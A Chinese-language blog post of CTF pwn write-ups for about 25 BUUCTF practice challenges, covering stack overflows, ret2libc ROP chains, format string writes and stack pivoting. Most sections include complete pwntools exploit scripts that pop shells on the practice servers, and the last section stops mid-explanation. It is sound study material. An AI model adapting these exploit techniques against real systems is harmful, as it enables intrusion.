---
title: Buuctf练习场pwn题
date: 2026-03-31 01:51:03
tags: [ctf, pwn]
---

# Buuctf pwn练习

[TOC]

[buu资源文件](https://buuoj.cn/resources)，特别是**libc**文件

## test_your_nc

连上直接拿shell

![](https://files.seeusercontent.com/2026/03/30/Xi1y/20260331015135.png)

## rip

明显的危险函数gets，栈溢出，写入的地址在rbp前15字节里，另外还发现一个后门函数**fun**

![](https://files.seeusercontent.com/2026/03/30/4cXj/20260331015340.png)

![](https://files.seeusercontent.com/2026/03/30/i4Wf/20260331015349.png)

看一下保护全关

![](https://files.seeusercontent.com/2026/03/30/sz7K/20260331015355.png)

先打一下试试

```python
from pwn import *
context.gdb_binary='pwndbg'
context.arch='amd64'

r=process('./pwn1')
# gdb.attach(r)
payload=b'a'*15+b'a'*8+p64(0x0401186)
r.sendline(payload)

r.interactive()
```

没打通，动态调试一下，在main函数ret处下个断点

![](https://files.seeusercontent.com/2026/03/30/wD5z/20260331015404.png)

确实可以跳到fun，继续跑，发现运行system时就停了

![](https://files.seeusercontent.com/2026/03/30/s8aM/20260331015416.png)

进system函数调试，跑到这里就跑不下去了，提示`<[0x7ffd46442c08] not aligned to 16 bytes>`，是栈没有对齐，可以看到这个地址是在栈当中的，地址要是16的倍数才能运行

![](https://files.seeusercontent.com/2026/03/30/0bBe/20260331015423.png)

跳过fun第一条的push rbp栈就满足对齐的条件了

```python
from pwn import *
context.gdb_binary='pwndbg'
context.arch='amd64'

# r=process('./pwn1')
r=remote('node5.buuoj.cn',27034)
payload=b'a'*15+b'a'*8+p64(0x00401187)
r.sendline(payload)

r.interactive()
```

## warmup_csaw_2016

ida看到gets，依旧栈溢出
![](https://files.seeusercontent.com/2026/03/30/1bDu/20260331015433.png)

看一下函数表有system，跟进一下，发现一个能输出flag的函数

![](https://files.seeusercontent.com/2026/03/30/j7Ga/20260331015438.png)

依旧栈对齐

```python
from pwn import *
context.gdb_binary='pwndbg'
context.arch='amd64'

# r=process('./warmup_csaw_2016')
r=remote('node5.buuoj.cn',26265)
payload=b'a'*0x40+b'a'*8+p64(0x040060E)
r.sendline(payload)

r.interactive()
```

## ciscn_2019_n_1

判断float局部变量是不是nan和目标值是否相等，是nan或者不等就跳走，依旧栈溢出，不过不是覆盖返回地址，而是覆盖main函数局部变量的小数

![](https://files.seeusercontent.com/2026/03/30/I4pk/20260331015447.png)

这里我先想到的是返回地址覆盖0x4006BE这个地址直接执行system("cat /flag")，当然可能栈可能会有不平衡的可能，但是幸运的是没有

```python
from pwn import *
context.gdb_binary='pwndbg'
# context.arch='amd64'

# r=process('./ciscn_2019_n_1')
r=remote('node5.buuoj.cn',28653)
payload=b'a'*0x30+b'a'*8+p32(0x04006BE)
r.sendline(payload)

r.interactive()
```

再做一遍覆盖局部变量的做法，找到要覆盖的值

![](https://files.seeusercontent.com/2026/03/30/5yMo/20260331015450.png)

```python
from pwn import *
context.gdb_binary='pwndbg'
# context.arch='amd64'

# r=process('./ciscn_2019_n_1')
r=remote('node5.buuoj.cn',28653)
payload=b'a'*(0x30-4)+p32(0x41348000)
r.sendline(payload)

r.interactive()
```

## pwn1_sctf_2016

发现危险函数**strcpy**，依旧栈溢出，还找到目标函数**get_flag**，但是**fgets**是安全函数，最多只能接受32也就是0x20个字符，但是后面进行了替换，让替换后的字符通过strcpy溢出就行了，**I**被替换成了**you**，

![](https://files.seeusercontent.com/2026/03/30/b9Da/20260331015453.png)

![](https://files.seeusercontent.com/2026/03/30/4Jkb/20260331015543.png)

![](https://files.seeusercontent.com/2026/03/30/p2Os/20260331015545.png)

返回地址前要0x3c+4字节，那我们用0x15个I再加一个字符行了，后面接上我们要执行的地址，总共0x1a个字符

```python
from pwn import *
context.gdb_binary='pwndbg'
# context.arch='amd64'

# r=process('./pwn1_sctf_2016')
r=remote('node5.buuoj.cn',27782)
# gdb.attach(r)
payload=b'I'*(0x15)+b'b'+p32(0x08048F0D)
r.sendline(payload)

r.interactive()
```

## jarvisoj_level0

依旧栈溢出，0x80的空间可以写入0x200字节，还有后门函数，调了一下需要栈对齐，那么直接跳过**callsystem**的第一个**push**吧

![](https://files.seeusercontent.com/2026/03/30/Wjb8/20260331015555.png)

![](https://files.seeusercontent.com/2026/03/30/Ra4e/20260331015712.png)

```python
from pwn import *
context.gdb_binary='pwndbg'
# context.arch='amd64'

# r=process('./level0')
r=remote('node5.buuoj.cn',25637)
# gdb.attach(r)
payload=b'I'*(0x80)+b'b'*8+p64(0x0400597)
r.sendline(payload)

r.interactive()
```

## [第五空间2019 决赛]PWN5

ida打开我们输入的name字符串会传入到printf第一个参数执行，可以利用格式化字符串漏洞，buf_是全局变量，在bss段能找到地址

![](https://files.seeusercontent.com/2026/03/30/jg9E/20260331015714.png)

![](https://files.seeusercontent.com/2026/03/30/0zqS/20260331015718.png)

printf函数不会检查第一个参数占位符和参数是否匹配，会按照占位符的去对应的位置取数据，因为越后面的参数，栈上的地址就越高

|         stack          |
| :--------------------: |
| printf执行完返回的地址 |
|      printf的参数      |
|     main的局部变量     |

如果这里我们没有给足printf参数，字符串的占位符就会访问到main的局部变量

printf格式化字符串不仅可以读取，还能写入数据

%Nd，%Nc可以输出N个字符

%p可以把对应位置的数据用16进制输出出来，%N\$p可以指定位置，N为1时就是相当于第一个占位符

%n，%hn，%hhn分别可以在对应位置的数据当做地址写入4，2，1字节输出到该%前字符的个数，同样的可以用%N\$n等指定位置

我们先通过写入aaaa标记buf的值，然后通过多个%p去找，如果对应位置出现0x61616161那么就是buf的位置

![](https://files.seeusercontent.com/2026/03/30/mi7S/20260331015722.png)

可以看到在第10个位置打印出了0x61616161，也就是这个位置就是buf在栈上的位置，我们把它修改为buf\_的地址，那么我们就能通过%n修改这个地址的值，也就是修改buf\_的值

```python
from pwn import *
context.gdb_binary='pwndbg'
# context.arch='amd64'

# r=process('./pwn')
r=remote('node5.buuoj.cn',27753)
# gdb.attach(r)
payload=p32(0x0804C044)+b'%10$n'
r.sendline(payload)
r.sendline('4') # 32位就是4字节，也就是4个字符

r.interactive()
```

## jarvisoj_level2

ida进到main函数一直往下看，read函数明显有漏洞，依旧栈溢出，只有0x88的空间，但是能读0x100个字符

![](https://files.seeusercontent.com/2026/03/30/9rvX/20260331015725.png)

跟进main时看到system函数，查看交叉引用都不是后门，

![](https://files.seeusercontent.com/2026/03/30/htH4/20260331015728.png)

![](https://files.seeusercontent.com/2026/03/30/eqN9/20260331015727.png)

![](https://files.seeusercontent.com/2026/03/30/ro2X/20260331015731.png)

我们需要/bin/sh字符串的地址，ida查看字符串，在data段发现了这个字符串

![](https://files.seeusercontent.com/2026/03/30/0cCp/20260331015734.png)

构造payload，模拟正常call system时栈的状态

| stack        |
| ------------ |
| return_addr  |
| arg1=/bin/sh |

```python
from pwn import *
context.gdb_binary='pwndbg'
# context.arch='amd64'

# r=process('./level2')
r=remote('node5.buuoj.cn',26726)
# gdb.attach(r)
payload=b'a'*0x88+b'b'*4+p32(0x08048320)+b'retn'+p32(0x0804A024)
r.sendline(payload)

r.interactive()
```

## ciscn_2019_n_8

scanf和gets一样不会检查长度，依旧是溢出，但这次不是栈溢出，var和n17都是全局变量，放在了bss段，我们通过溢出覆盖n17的值就能拿到shell了

![](https://files.seeusercontent.com/2026/03/30/k4fO/20260331015736.png)

![](https://files.seeusercontent.com/2026/03/30/4Yed/20260331015737.png)

```python
from pwn import *
context.gdb_binary='pwndbg'
# context.arch='amd64'

# r=process('./ciscn_2019_n_8')
r=remote('node5.buuoj.cn',28983)
# gdb.attach(r)
payload=b'a'*0x34+p32(17)
r.sendline(payload)

r.interactive()
```

## bjdctf_2020_babystack

ida打开看到先是scanf读取一个数字到nbytes里，然后read再往rbp-0x10里写入刚刚输入数字的字符，依旧栈溢出

![](https://files.seeusercontent.com/2026/03/30/Gp8v/20260331015740.png)

提一下，x64的前6个参数分别放在rdi，rsi，rdx，rcx，r8，r9，超过的放在栈上

发现后门函数，直接用会发现栈没有对齐，直接跳到push下一行

![](https://files.seeusercontent.com/2026/03/30/f8aO/20260331015742.png)

```python
from pwn import *
context.gdb_binary='pwndbg'
# context.arch='amd64'

# r=process('./bjdctf_2020_babystack')
r=remote('node5.buuoj.cn',29008)
# gdb.attach(r)
r.sendline(str(100))
payload=b'a'*0x10+b'b'*8+p64(0x04006E7)
r.sendline(payload)

r.interactive()
```

## ciscn_2019_c_1

运行可以看到是一个加密系统，ida查看加密函数可以看到gets，依旧栈溢出，没有后门函数利用，也没有system,/bin/sh

![](https://files.seeusercontent.com/2026/03/30/bnO6/20260331015745.png)

![](https://files.seeusercontent.com/2026/03/30/8pLv/20260331015747.png)

encrypt函数会把传进来的数据进行处理，处理长度是根据strlen计算的，实际上就是计算到\x00的长度

![](https://files.seeusercontent.com/2026/03/30/4nzI/20260331015750.png)

strlen源码确实是这样的

![](https://files.seeusercontent.com/2026/03/30/nIf6/20260331020144.png)

这样的话我们把第一个字符设为\x00就不会操作我们后面的数据了

因为这是64位，我们不能通过栈传递参数了，用ROPgadget找一个pop rdi;ret，来用栈上的数据给rdi赋值，再继续ret执行下一条指令

![](https://files.seeusercontent.com/2026/03/30/zeW1/20260331015756.png)

可以看出是动态链接**dynamically linked**，库函数并不在文件里，我们需要获取libc里真实的函数地址

![](https://files.seeusercontent.com/2026/03/30/dmH7/20260331015758.png)

构造payload，我们先用puts把puts的got打印出来，再ret到encrypt进行循环，把gets的got也打印出来

```python
from pwn import *
context.gdb_binary='pwndbg'
# context.log_level = 'debug'
# context.arch='amd64'

filename='./ciscn_2019_c_1'
# r=process(filename)
elf=ELF(filename)
r=remote('node5.buuoj.cn',28139)
# gdb.attach(r)


puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
gets_got=elf.got['gets']

pop_rdi_ret=0x0400c83
encrypt_addr=0x04009A0

r.sendline('1')

r.recvuntil('encrypted\n')
payload=b'\x00'+b'a'*(0x50-1)+b'b'*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(encrypt_addr)
r.sendline(payload)
r.recvline()
r.recvline()
gets_addr=u64(r.recvline()[:-1].ljust(8,b'\x00'))
print(hex(gets_addr))

r.recv()
payload=b'\x00'+b'a'*(0x50-1)+b'b'*8+p64(pop_rdi_ret)+p64(gets_got)+p64(puts_plt)+p64(encrypt_addr)
r.sendline(payload)
r.recvline()
r.recvline()
puts_addr=u64(r.recvline()[:-1].ljust(8,b'\x00'))
print(hex(puts_addr))



r.interactive()
```

![](https://files.seeusercontent.com/2026/03/30/4bvX/20260331015802.png)

在线查一下[libc](https://libc.rip/)获取libc的system和/bin/sh的偏移地址，还有puts的地址，用来计算libc基址

![](https://files.seeusercontent.com/2026/03/30/f5dU/20260331015804.png)

打了一下，没通，用ret平衡一下栈就通了

```python
from pwn import *
context.gdb_binary='pwndbg'
# context.log_level = 'debug'
# context.arch='amd64'

filename='./ciscn_2019_c_1'
# r=process(filename)
elf=ELF(filename)
r=remote('node5.buuoj.cn',28139)
# gdb.attach(r)


puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
gets_got=elf.got['gets']

pop_rdi_ret=0x0400c83
ret=0x04006b9
encrypt_addr=0x04009A0

r.sendline('1')

r.recvuntil('encrypted\n')
payload=b'\x00'+b'a'*(0x50-1)+b'b'*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(encrypt_addr)
r.sendline(payload)
r.recvline()
r.recvline()
puts_addr=u64(r.recvline()[:-1].ljust(8,b'\x00'))
print(hex(puts_addr))

libc_base=puts_addr-0x809c0
str_bin_sh=libc_base+0x1b3e9a
system_addr=libc_base+0x4f440

r.recv()
payload=b'\x00'+b'a'*(0x50-1)+b'b'*8+p64(ret)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)
r.sendline(payload)
r.recvline()
r.recvline()

r.interactive()
```

## jarvisoj_level2_x64

vulnerable_function处_read可以栈溢出，有system plt，/bin/sh字符串，找个pop rdi；ret和ret的gadget就行了

![](https://files.seeusercontent.com/2026/03/30/U1yi/20260331015807.png)

![](https://files.seeusercontent.com/2026/03/30/v7Rc/20260331015810.png)

![](https://files.seeusercontent.com/2026/03/30/2nsC/20260331015812.png)

![](https://files.seeusercontent.com/2026/03/30/3npD/20260331015820.png)

```python
from pwn import *
context.gdb_binary='pwndbg'
# context.log_level = 'debug'
# context.arch='amd64'

filename='./level2_x64'
elf=ELF(filename)
# r=process(filename)
r=remote('node5.buuoj.cn',29473)
# gdb.attach(r)

pop_rdi=0x04006b3
ret=0x04004a1

payload=b'a'*0x80+b'b'*8+p64(ret)+p64(pop_rdi)+p64(0x0600A90)+p64(0x04004C0)
r.sendline(payload)

r.interactive()
```

## get_started_3dsctf_2016

用ida打开发现很乱，用objdump看看，发现不是标准的cdecl调用约定，参数是从esp开始的，使用esp寻址而不是ebp

![](https://files.seeusercontent.com/2026/03/30/ddJ8/20260331015823.png)

![](https://files.seeusercontent.com/2026/03/30/6dfF/20260331015825.png)

本地能打通，但是远程没通，用ida mcp问下ai，说是缓冲区刷新问题

![](https://files.seeusercontent.com/2026/03/30/1kbS/20260331015827.png)

看看源码

![](https://files.seeusercontent.com/2026/03/30/gR6p/20260331015831.png)

![](https://files.seeusercontent.com/2026/03/30/4Hzq/20260331015833.png)

![](https://files.seeusercontent.com/2026/03/30/x7gH/20260331015835.png)

这里触发了flush操作，继续跟进

![](https://files.seeusercontent.com/2026/03/30/ii0D/20260331015837.png)

![](https://files.seeusercontent.com/2026/03/30/6Ool/20260331015840.png)

`_IO_OVERFLOW`是个宏，实际上就是虚函数调用`fp->vtable->__overflow(fp, EOF)`，根据文件流的类型，`__overflow`绑定的函数也不一样，我们的`stdout`绑定的是`_IO_file_overflow`

![](https://files.seeusercontent.com/2026/03/30/iYq9/20260331015843.png)

![](https://files.seeusercontent.com/2026/03/30/5Oxz/20260331015844.png)

![](https://files.seeusercontent.com/2026/03/30/ag7U/20260331015847.png)

`_IO_file_overflow`实际上是`_IO_new_file_overflow`

![](https://files.seeusercontent.com/2026/03/30/Unh7/20260331015850.png)

`_IO_new_file_overflow`调用了`_IO_do_write`

![](https://files.seeusercontent.com/2026/03/30/i4nQ/20260331015852.png)

![](https://files.seeusercontent.com/2026/03/30/yb8Z/20260331015854.png)

`_IO_do_write`实际上又是`_IO_new_do_write`，它又调用了`new_do_write`，在他里面调用`_IO_SYSWRITE`才是真的写出数据

![](https://files.seeusercontent.com/2026/03/30/gKj1/20260331015856.png)

说这么多其实就是`exit`函数会自动`flush`

```python
from pwn import *
context.gdb_binary='pwndbg'
# context.log_level = 'debug'
# context.arch='amd64'

filename='./get_started_3dsctf_2016'
elf=ELF(filename)
# r=process(filename)
r=remote('node5.buuoj.cn',29826)
# gdb.attach(r)
# input()


payload=b'a'*0x38+p32(0x080489a0)+p32(0x0804E6A0)+p32(0x308cd64f)+p32(0x195719d1)
r.sendline(payload)

r.interactive()
```

## [HarekazeCTF2019]baby_rop

看一下scanf函数栈溢出，还有system函数，`/bin/sh`也有

![](https://files.seeusercontent.com/2026/03/30/9zmM/20260331015859.png)

![](https://files.seeusercontent.com/2026/03/30/tfI1/20260331015902.png)

因为是64位的，所以需要一个`pop rdi;ret`的gadget，还有单独的`ret`防止system被调用时没有对齐栈

![](https://files.seeusercontent.com/2026/03/30/rk7D/20260331015904.png)

```python
from pwn import *
context.gdb_binary='pwndbg'
# context.log_level = 'debug'
# context.arch='amd64'

filename='./babyrop'
elf=ELF(filename)
# r=process(filename)
r=remote('node5.buuoj.cn',27478)

pop_rdi=0x00400683
ret=0x0400479


bin_sh=elf.sym['binsh']
system_addr=elf.plt['system']


payload=b'a'*0x18+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)
r.sendline(payload)

r.interactive()
```

## others_shellcode

连上直接拿到shell，调试看一下

![](https://files.seeusercontent.com/2026/03/30/6dGu/20260331015907.png)

`int 0x80`这条指令实际上是执行了`SYS_execve`函数，这是linux内核的函数，查一下源码，`int 0x80`是`syscall`，而`syscall`根据eax的值执行不同的函数

![](https://files.seeusercontent.com/2026/03/30/0ahL/20260331015909.png)

程序的`eax=0xb=11`，执行了`sys_execve`函数，`execve("/bin/sh",buf,0);`，`syscall(eax,ebx,ecx,edx)`

## [OGeek2019]babyrop

ida看到这个`sub_804871F`函数里用strlen计算了我们输入字符串的长度，我们可以通过`\x00`截断跳过比较，我们就可以控制`bufa`的内容

![](https://files.seeusercontent.com/2026/03/30/nW5t/20260331015920.png)

![](https://files.seeusercontent.com/2026/03/30/uVq3/20260331015922.png)

我们可以控制`nbytes`的值，造成栈溢出，只要我们`nbytes`不为127，就能往`buff`写入`nbytes`个字节，`nbytes`是`char`最大只有255

![](https://files.seeusercontent.com/2026/03/30/6ypM/20260331015924.png)

要覆盖`ebp`我们需要输入`0xe7+4`字节，那么我们从esp最多能写入5条4字节数据

先leak出`write`的真实地址，根据题目给的libc计算`system`和`/bin/sh`字符串的的真实地址，利用栈溢出执行`system("/bin/sh")`

```python
from pwn import *
context.gdb_binary='pwndbg'


config={
  'filename':'./pwn',
  'remote':1,
  'debug':0,
  'log':0,
  'host':'node5.buuoj.cn',
  'port':25957
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf


p,elf=init()

def leak_addr(got_addr,name='addr'):
  payload=b'a'*0xe7 #buff
  payload+=b'a'*4 #ebp,rbp
  payload+=p32(write_plt) #esp,rsp
  payload+=p32(main)
  payload+=p32(1)
  payload+=p32(got_addr)
  payload+=p32(4)
  p.sendline(payload)
  addr=u32(p.recv(4))
  print(f'{name}: {hex(addr)}')
  return addr



write_plt=elf.plt['write']
write_got=elf.got['write']
main=0x08048825



payload=b'\x00'+b'\xff'*30
p.sendline(payload)
p.recvline()

write_addr=leak_addr(write_got,'*write_got')





libc=ELF('./libc-2.23.so')
libc_base=write_addr-libc.sym['write']
system_addr=libc.sym['system']+libc_base
binsh_addr = libc_base + next(libc.search('/bin/sh'.encode()))


payload=b'\x00'+b'\xff'*30
p.sendline(payload)
p.recvline()


payload=b'a'*0xe7 #buff
payload+=b'a'*4 #ebp,rbp
payload+=p32(system_addr) #esp,rsp
payload+=p32(main)
payload+=p32(binsh_addr)
p.sendline(payload)


p.interactive()
```

## ciscn_2019_n_5

`main`函数里看到危险函数`gets`，栈溢出，有个全局变量`name`在`bss`段可写，我们可以在里面写`/bin/sh`，通过ROP泄露`puts`地址，再获取system地址就能构造`system("/bin/sh")`了

![](https://files.seeusercontent.com/2026/03/30/zB1d/20260331015929.png)

![](https://files.seeusercontent.com/2026/03/30/Tc2l/20260331015928.png)

![](https://files.seeusercontent.com/2026/03/30/0rrP/20260331015931.png)

`checksec`看一下，保护全关，好像段权限有点大，不过调试了一下没有执行权限不能写`shellcode`

![](https://files.seeusercontent.com/2026/03/30/7Rgk/20260331015933.png)

![](https://files.seeusercontent.com/2026/03/30/0Jrd/20260331015936.png)

拿一下`gadget`

![](https://files.seeusercontent.com/2026/03/30/2aUm/20260331015938.png)

```python
from pwn import *
import libcfind
context.gdb_binary='pwndbg'


config={
  'filename':'./ciscn_2019_n_5',
  'remote':1,
  'debug':0,
  'log':0,
  'host':'node5.buuoj.cn',
  'port':29069
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']==1:
    context.log_level = 'debug'
  return p,elf


p,elf=init()

def leak_addr(got_addr,name='addr'):
  payload=b'a'*0x20 #buff
  payload+=b'a'*8 #ebp,rbp
  payload+=p64(pop_rdi)
  payload+=p64(got_addr)
  payload+=p64(puts_plt)
  payload+=p64(main)
  p.sendline(payload)
  addr=u64(p.recvline()[:-1].ljust(8,b'\x00'))
  print(f'{name}: {hex(addr)}')
  return addr



puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main=elf.sym['main']
pop_rdi=0x0000000000400713
ret=0x00000000004004c9

p.recvline()
p.sendline('1')
p.recvline()
p.recvline()


puts_addr=leak_addr(puts_got,'puts')
libc=libcfind.finder('puts',puts_addr,num=1)
system_addr=libc.dump('system')
binsh=libc.dump('str_bin_sh')


p.recvline()
p.sendline('1')
p.recvline()
p.recvline()


payload=b'a'*0x20 #buff
payload+=b'a'*8 #ebp,rbp
payload+=p64(ret)
payload+=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(system_addr)
payload+=p64(0)
p.sendline(payload)



p.interactive()
```

## not_the_same_3dsctf_2016

栈溢出，`get_secret`可以把flag从文件中读取出来存到`bss`段里

![](https://files.seeusercontent.com/2026/03/30/5Qgq/20260331015943.png)

![](https://files.seeusercontent.com/2026/03/30/9nuZ/20260331015945.png)

![](https://files.seeusercontent.com/2026/03/30/Ae0g/20260331015947.png)

函数表有很多函数，看了一下是静态编译

![](https://files.seeusercontent.com/2026/03/30/nl6S/20260331015952.png)

找一个能打印的函数，`main`函数用了`printf`，直接用这个

```python
from pwn import *
context.gdb_binary='pwndbg'


config={
  'filename':'./not_the_same_3dsctf_2016',
  'remote':1,
  'debug':0,
  'log':0,
  'host':'node5.buuoj.cn',
  'port':29871
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf


p,elf=init()

payload=b'a'*0x2d
payload+=p32(elf.sym['get_secret'])
payload+=p32(elf.sym['printf'])
payload+=p32(elf.sym['exit'])
payload+=p32(elf.sym['fl4g'])
p.sendline(payload)


p.interactive()
```

## ciscn_2019_en_2

和[ciscn_2019_c_1](##ciscn_2019_c_1)一样

## ciscn_2019_ne_5

AddLog可以往src写入128个字符，也就是0x80字符

![](https://files.seeusercontent.com/2026/03/30/hj4Y/20260331015958.png)

GetFlag可以把src的字符复制到dest上，但是0x80字符大于0x48，可以造成栈溢出

![](https://files.seeusercontent.com/2026/03/30/Xj3d/20260331020000.png)

```python
from pwn import *
import libcfind
context.gdb_binary='pwndbg'


config={
  'filename':'./ciscn_2019_ne_5',
  'remote':1,
  'debug':0,
  'log':1,
  'host':'node5.buuoj.cn',
  'port':26582
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf


p,elf=init()





puts_plt=elf.plt['puts']
system_plt=elf.plt['system']
system_got=elf.got['system']
main=elf.sym['main']

p.sendlineafter(':','administrator')

p.recvuntil(':')
p.sendlineafter(':','3')




p.recvuntil(':')
p.sendlineafter(':','1')


payload=b'a'*0x48 #buff
payload+=b'a'*4 #ebp,rbp
payload+=p32(puts_plt) #esp,rsp
payload+=p32(main)
payload+=p32(system_got)
p.sendlineafter(':',payload)


p.recvuntil(':')
p.sendlineafter(':','4')
p.recvline()

system_addr=u32(p.recvline()[:4])
print(f"system: {hex(system_addr)}")
libc=libcfind.finder('system',system_addr)
binsh=libc.dump('str_bin_sh')


p.sendlineafter(':','administrator')

p.recvuntil(':')
p.sendlineafter(':','1')


payload=b'a'*0x48 #buff
payload+=b'a'*4 #ebp,rbp
payload+=p32(system_addr) #esp,rsp
payload+=p32(main)
payload+=p32(binsh)
p.sendlineafter(':',payload)


p.recvuntil(':')
p.sendlineafter(':','4')


p.interactive()
```

## 铁人三项(第五赛区)_2018_rop

栈溢出，leak地址，拿到libc符号地址，调用`system('/bin/sh')`

![](https://files.seeusercontent.com/2026/03/30/8tTb/20260331020003.png)

```python
from pwn import *
import libcfind
context.gdb_binary='pwndbg'


config={
  'filename':'./2018_rop',
  'remote':1,
  'debug':0,
  'log':0,
  'host':'node5.buuoj.cn',
  'port':27685
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf


def leak_addr(got_addr,name='addr'):
  payload=b'a'*0x88 #buff
  payload+=b'a'*4 #ebp,rbp
  payload+=p32(write_plt) #esp,rsp
  payload+=p32(main)
  payload+=p32(1)
  payload+=p32(got_addr)
  payload+=p32(4)
  p.sendline(payload)
  addr=u32(p.recv(4))
  print(f'{name}: {hex(addr)}')
  return addr

p,elf=init()





write_plt=elf.plt['write']
write_got=elf.got['write']
main=elf.sym['main']

write_addr=leak_addr(write_got,'write')
libc=libcfind.finder('write',write_addr)
system_addr=libc.dump('system')
binsh=libc.dump('str_bin_sh')

payload=b'a'*0x88 #buff
payload+=b'a'*4 #ebp,rbp
payload+=p32(system_addr)
payload+=p32(main)
payload+=p32(binsh)
p.sendline(payload)

p.interactive()
```

## bjdctf_2020_babystack2

需要输入读取字节的长度并进行判断，直接用负数，调用read函数时被转成无符号数了，栈溢出，还有个后门函数

![](https://files.seeusercontent.com/2026/03/30/us6D/20260331020006.png)

![](https://files.seeusercontent.com/2026/03/30/Fz5a/20260331020008.png)

```python
from pwn import *
import libcfind
context.gdb_binary='pwndbg'


config={
  'filename':'./bjdctf_2020_babystack2',
  'remote':1,
  'debug':0,
  'log':0,
  'host':'node5.buuoj.cn',
  'port':28771
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf



p,elf=init()

p.sendline('-1')

rop=ROP(elf)
payload=b'a'*0x10
payload+=b'a'*8
# payload+=p64(rop.ret.address)
payload+=p64(elf.sym['backdoor'])
p.sendline(payload)


p.interactive()
```

## jarvisoj_fm

`read`没有溢出了，但是我们输入的数据会传给`printf`的第一个参数打印出来，格式化字符串漏洞，试试pwntools的库

![](https://files.seeusercontent.com/2026/03/30/p6Tj/20260331020012.png)

```python
from pwn import *
import libcfind
context.gdb_binary='pwndbg'


config={
  'filename':'./fm',
  'remote':1,
  'debug':0,
  'log':0,
  'host':'node5.buuoj.cn',
  'port':26151
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf



p,elf=init()

def exec_fmt(payload):
    p = process(config['filename'])
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

payload = fmtstr_payload(offset, {elf.sym['x']: 4},write_size='int')
p.sendline(payload)

p.interactive()
```

## bjdctf_2020_babyrop

栈溢出

![](https://files.seeusercontent.com/2026/03/30/Fp8b/20260331020015.png)

```python
from pwn import *
import libcfind
context.gdb_binary='pwndbg'


config={
  'filename':'./bjdctf_2020_babyrop',
  'remote':1,
  'debug':0,
  'log':0,
  'host':'node5.buuoj.cn',
  'port':26204
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf

def leak_addr(got_addr,name='addr'):
  payload=b'a'*0x20 #buff
  payload+=b'a'*8 #ebp,rbp
  payload+=p64(pop_rdi)
  payload+=p64(got_addr)
  payload+=p64(puts_plt)
  payload+=p64(main)
  p.sendline(payload)
  addr=u64(p.recvline(drop=True).ljust(8,b'\x00'))
  print(f'{name}: {hex(addr)}')
  return addr

p,elf=init()

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main=elf.sym['main']
rop=ROP(elf)
pop_rdi=rop.rdi.address
ret=rop.ret.address

p.recvuntil('story!\n')
puts_addr=leak_addr(puts_got,'puts')
# libc=libcfind.finder('puts',puts_addr)
# system_addr=libc.dump('system')
# binsh=libc.dump('str_bin_sh')
binsh=puts_addr+	0x11d6c7
system_addr=puts_addr	-0x2a300

p.recvuntil('story!\n')
payload=b'a'*0x20 #buff
payload+=b'a'*8 #ebp,rbp
payload+=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(ret)
payload+=p64(system_addr)
payload+=p64(main)
p.sendline(payload)

p.interactive()
```

## jarvisoj_tell_me_something

栈溢出，但是没有使用`rbp`寻址，`good_game`函数直接打印`flag`

![](https://files.seeusercontent.com/2026/03/30/R7qh/20260331020018.png)

![](https://files.seeusercontent.com/2026/03/30/bO2c/20260331020020.png)

```python
from pwn import *
import libcfind
context.gdb_binary='pwndbg'


config={
  'filename':'./guestbook',
  'remote':1,
  'debug':0,
  'log':0,
  'host':'node5.buuoj.cn',
  'port':25610
}


def init():
  elf=ELF(config['filename'])
  if config['remote']:
    p=remote(config['host'],config['port'])
  else:
    p=process(config['filename'])
  if config['debug']:
    gdb.attach(p)
    input('enter to run')
  if config['log']:
    context.log_level = 'debug'
  return p,elf



p,elf=init()
goodGame=elf.sym['good_game']

p.recvuntil('Input your message:\n')
payload=b'a'*0x88
# payload+=b'a'*8
payload+=p64(goodGame)
p.sendline(payload)


p.interactive()
```

## ciscn_2019_es_2

栈溢出，但是只能覆盖返回地址，需要栈迁移

![](https://files.seeusercontent.com/2026/03/30/5udW/20260331020023.png)

正常调用是这样的

![](https://files.seeusercontent.com/2026/03/30/y3Rs/20260331020025.png)

现在我们可以通过修改`old ebp`和`return address`，`ret`到一个`leave;ret`上

![](https://files.seeusercontent.com/2026/03/30/9hFp/20260331020028.png)

至此`esp`就被我们放到新的地址，这个地址就是我们在原来`ebp`位置的值，我们可以通过溢出覆盖它

